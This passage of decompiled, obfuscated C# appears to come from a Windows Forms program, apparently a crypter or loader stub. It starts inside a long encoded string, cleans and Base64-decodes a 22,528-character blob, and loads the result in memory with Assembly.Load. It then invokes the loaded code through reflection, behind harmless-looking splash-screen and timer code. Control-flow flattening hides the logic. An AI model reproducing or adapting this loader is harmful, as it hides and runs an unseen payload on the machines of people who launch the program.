02df\u0302\u02ef\u02df\u0313\u02df??\u02f3\u02df\u02f1\u02ef\u02df\u0313\u02df\u02e5\u02ef\u02df\u0300\u02df??\u0311\u200c??\u200c??\u02f1\u200c??\u02f1\u200c????\u02df\u02f2\u02df??\u030a\u02df\u02e5\u0301\u02df\u02f7\u02ef??\u0311\u02df??\u02eb\u02df\u0300\u0315??\u0315\u02df\u02e6\u0309\u02df\u0301\u0305??\u030e\u02df\u02e5\u0301\u02df\u02ff\u02df????\u200c??\u200c??\u02ef\u0315??\u0314\u02df\u02e6\u200c??\u0303\u02ef??\u0317\u02df\u02e5\u0309\u02df\u02f8\u0315??\u030d\u02df\u02e6\u02ef\u02df\u02e7\u02df??\u030e\u02df??\u200c??\u02e7\u200c??\u0317\u02df??\u200c??\u02eb\u02ef\u02df??\u200c??\u200c??\u02e9\u0305\u02df??\u200c????\u02df\u02f2\u02df??\u030a\u02df\u02e5\u0301\u02df\u02f7\u02ef??\u0311\u02df??\u02ef\u02df\u0301\u0305??\u0306\u02df\u02e5\u02ef\u02df\u02f8\u02ef??\u0312\u02df\u02e5??\u02df\u0301\u0305??\u0310\u02df\u02e6\u02eb\u200c??\u200c??\u200c??\u200c??\u200c??\u02df????\u200c??\u02d2\u200c??\u02ef????\u02df\u02e6\u02e7\u02df\u02ff\u02ef??\u030c\u02df\u02e5\u0309\u02df\u0300\u0305??\u0306\u02df\u02e5\u0315\u02df\u02f0\u0305??\u030e\u02df\u02e5\u0315\u02df\u02f8\u02ef??\u0313\u02df\u02e5??\u02df\u0300\u02ef??\u030a\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02ea\u0305??\u02f4\u02df??\u0309\u02df\u02ea\u0305??\u0309\u02df\u02e5\u0315\u02df\u0300\u200c??\u200c????\u02ef\u02df??\u0305\u02df??\u02df??\u200c??\u0301\u0305??\u0314\u02df\u02e5\u02ef\u02df\u0302\u02ef??\u0308\u02df\u02e6\u02ef\u02df\u02f2\u0305??\u0306\u02df\u02e5??\u02df\u02f8\u02ef\u200c??\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02e7\u02df??\u02f4\u02df??\u0309\u200c??\u200c????\u200c??\u0305\u200c??\u02ef??\u02ef\u02df\u02e6\u02e7\u02df\u0300\u0315??\u0309\u02df\u02e6\u02f3\u02df\u02f7\u0315????\u02df??\u02f7\u02df\u02f8\u02ef??\u0317\u02df\u02e6\u02eb\u02df\u02ff\u02ef??\u0314\u02df\u02e5\u02d2\u200c??\u200c??\u0316\u02df??\u02d2\u02df\u02eb\u0315\u02df\u0313\u02df??\u200c??\u02ea\u0305\u02df\u0315\u200c??\u200c??\u02ed\u200c??\u02e7\u200c????\u02df\u02ef\u02ef??\u0318\u02df\u02e6\u02eb\u02df\u02f8\u02ef??\u0312\u02df\u02e5\u02e7\u02df\u0300\u02df??\u02d3\u02df??\u200c??\u02f4\u0305??\u030a\u02df\u02e6\u02e7\u02df\u0301\u0315??\u030e\u02df\u02e5\u02d6\u02df\u0300\u0305\u200c??\u02df????\u02df\u02ea\u0305\u02df\u0318\u02df??\u02d2\u02df\u02eb\u200c??\u0313\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02ef\u200c??\u02df\u02eb\u200c??\u200c??????\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df", "\u200c??", "\u02df\u02df");
					string_ = smethod_4(text);
					num = (int)((num2 * 79152018) ^ 0x2C1C72D6);
					continue;
				case 3u:
					smethod_7(object_);
					num = ((int)num2 * -1494549706) ^ 0x63D8723;
					continue;
				case 2u:
					result = text;
					num = (int)(num2 * 2032986647) ^ -1588873179;
					continue;
				case 1u:
					num = (int)((num2 * 72397798) ^ 0x63CDD5E2);
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static object smethod_6(char[] char_0)
	{
		int num3 = default(int);
		bool flag = default(bool);
		object result = default(object);
		while (true)
		{
			int num = 2143316324;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x30E3C358u) % 12u)
				{
				case 11u:
					num3 = 251367175;
					num = 1885013844;
					continue;
				case 10u:
				{
					int num6;
					if (num3 != 251367153)
					{
						num = 1237182095;
						num6 = 1237182095;
					}
					else
					{
						num = 814456238;
						num6 = 814456238;
					}
					continue;
				}
				case 9u:
					num = ((int)num2 * -1101245535) ^ -408667381;
					continue;
				case 8u:
					num3 = 251367135;
					flag = false;
					num = (int)(num2 * 1787102920) ^ -1325432029;
					continue;
				case 7u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -105739778;
						num5 = -105739778;
					}
					else
					{
						num4 = -834237595;
						num5 = -834237595;
					}
					num = num4 ^ ((int)num2 * -1449501152);
					continue;
				}
				case 6u:
					num3 = 251367192;
					num = ((int)num2 * -1219612053) ^ 0x2A0E921F;
					continue;
				case 5u:
					num3 = 251367199;
					num = (int)((num2 * 1596600061) ^ 0x25EA5CDA);
					continue;
				case 3u:
					num = (int)((num2 * 1141845143) ^ 0x5FD54F7C);
					continue;
				case 2u:
					num = ((int)num2 * -465929515) ^ -2068082369;
					continue;
				case 0u:
					result = GForm1.smethod_79(char_0, 0, 22528);
					num = (int)(num2 * 2114332338) ^ -1682245319;
					continue;
				case 4u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static object smethod_7(object object_0)
	{
		object result = default(object);
		while (true)
		{
			int num = 1326572721;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x47C044F0u) % 3u)
				{
				case 1u:
					goto IL_0003;
				case 2u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				smethod_2((Assembly)object_0);
				num = ((int)num2 * -1773104266) ^ -2048398159;
			}
		}
	}

	static void smethod_8(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_9(Form form_0, FormClosingEventHandler formClosingEventHandler_0)
	{
		form_0.add_FormClosing(formClosingEventHandler_0);
	}

	static void smethod_10(Form form_0)
	{
		Application.Run(form_0);
	}

	static Process smethod_11()
	{
		return Process.GetCurrentProcess();
	}

	static void smethod_12(Process process_0, ProcessPriorityClass processPriorityClass_0)
	{
		process_0.PriorityClass = processPriorityClass_0;
	}

	static string smethod_13()
	{
		return Application.get_StartupPath();
	}

	static string smethod_14(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static Image smethod_15(string string_0)
	{
		return Image.FromFile(string_0);
	}

	static void smethod_16(Control control_0, Image image_0)
	{
		control_0.set_BackgroundImage(image_0);
	}

	static Image smethod_17(Control control_0)
	{
		return control_0.get_BackgroundImage();
	}

	static void smethod_18(Timer timer_2)
	{
		timer_2.Start();
	}

	static void smethod_19()
	{
		GC.Collect();
	}

	static void smethod_20(object object_0)
	{
		GC.SuppressFinalize(object_0);
	}

	static int smethod_21(Image image_0)
	{
		return image_0.get_Width();
	}

	static int smethod_22(Image image_0)
	{
		return image_0.get_Height();
	}

	static Bitmap smethod_23(int int_2, int int_3)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_2, int_3);
	}

	static Graphics smethod_24(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static ColorMatrix smethod_25()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ColorMatrix();
	}

	static void smethod_26(ColorMatrix colorMatrix_0, float float_1)
	{
		colorMatrix_0.set_Matrix33(float_1);
	}

	static ImageAttributes smethod_27()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ImageAttributes();
	}

	static void smethod_28(ImageAttributes imageAttributes_0, ColorMatrix colorMatrix_0, ColorMatrixFlag colorMatrixFlag_0, ColorAdjustType colorAdjustType_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		imageAttributes_0.SetColorMatrix(colorMatrix_0, colorMatrixFlag_0, colorAdjustType_0);
	}

	static void smethod_29(Graphics graphics_0, Image image_0, Rectangle rectangle_0, int int_2, int int_3, int int_4, int int_5, GraphicsUnit graphicsUnit_0, ImageAttributes imageAttributes_0)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, rectangle_0, int_2, int_3, int_4, int_5, graphicsUnit_0, imageAttributes_0);
	}

	static void smethod_30(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static void smethod_31(Timer timer_2)
	{
		timer_2.Stop();
	}

	static void smethod_32(Timer timer_2, int int_2)
	{
		timer_2.set_Interval(int_2);
	}

	static void smethod_33(Control control_0)
	{
		control_0.Show();
	}

	static void smethod_34(Form form_0)
	{
		form_0.Close();
	}

	static DialogResult smethod_35(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
	}

	static void smethod_36(Process process_0)
	{
		process_0.Kill();
	}

	static void smethod_37(CancelEventArgs cancelEventArgs_0, bool bool_3)
	{
		cancelEventArgs_0.Cancel = bool_3;
	}

	static void smethod_38(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_39()
	{
		return new Container();
	}

	static PictureBox smethod_40()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static Timer smethod_41(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static void smethod_42(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_43(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_44(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_45(Control control_0, ImageLayout imageLayout_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_BackgroundImageLayout(imageLayout_0);
	}

	static void smethod_46(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_47(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_48(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_49(PictureBox pictureBox_5, int int_2)
	{
		pictureBox_5.set_TabIndex(int_2);
	}

	static void smethod_50(PictureBox pictureBox_5, bool bool_3)
	{
		pictureBox_5.set_TabStop(bool_3);
	}

	static void smethod_51(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_52(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_53(Form form_0, Color color_0)
	{
		form_0.set_BackColor(color_0);
	}

	static void smethod_54(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_55(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_56(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static Font smethod_57(string string_0, float float_1, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_1, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_58(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_59(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_60(Form form_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_Margin(padding_0);
	}

	static void smethod_61(Form form_0, bool bool_3)
	{
		form_0.set_MaximizeBox(bool_3);
	}

	static void smethod_62(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_63(Form form_0, FormStartPosition formStartPosition_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_StartPosition(formStartPosition_0);
	}

	static void smethod_64(Form form_0, string string_0)
	{
		form_0.set_Text(string_0);
	}

	static void smethod_65(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_66(Control control_0, bool bool_3)
	{
		control_0.ResumeLayout(bool_3);
	}

	static MethodInfo[] smethod_67(Type type_0)
	{
		return type_0.GetMethods();
	}

	static object smethod_68(object object_0, string string_0, CallType callType_0, object[] object_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return Versioned.CallByName(object_0, string_0, callType_0, object_1);
	}

	static Type[] smethod_69(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static Assembly smethod_70(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static char smethod_71(string string_0, int int_2)
	{
		return string_0[int_2];
	}

	static string smethod_72(char char_0)
	{
		return Conversions.ToString(char_0);
	}

	static int smethod_73(string string_0)
	{
		return Strings.AscW(string_0);
	}

	static char smethod_74(int int_2)
	{
		return Strings.Chr(int_2);
	}

	static int smethod_75(string string_0)
	{
		return string_0.Length;
	}

	static string smethod_76(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	static char[] smethod_77(string string_0)
	{
		return string_0.ToCharArray();
	}

	static object smethod_78(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static byte[] smethod_79(char[] char_0, int int_2, int int_3)
	{
		return Convert.FromBase64CharArray(char_0, int_2, int_3);
	}

	static void smethod_80(Timer timer_2, EventHandler eventHandler_0)
	{
		timer_2.remove_Tick(eventHandler_0);
	}

	static void smethod_81(Timer timer_2, EventHandler eventHandler_0)
	{
		timer_2.add_Tick(eventHandler_0);
	}

	static void smethod_82(Control control_0, EventHandler eventHandler_0)
	{
		control_0.remove_MouseEnter(eventHandler_0);
	}

	static void smethod_83(Control control_0, EventHandler eventHandler_0)
	{
		control_0.remove_MouseLeave(eventHandler_0);
	}

	static void smethod_84(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.remove_MouseClick(mouseEventHandler_0);
	}

	static void smethod_85(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseEnter(eventHandler_0);
	}

	static void smethod_86(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseLeave(eventHandler_0);
	}

	static void smethod_87(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseClick(mouseEventHandler_0);
	}
}
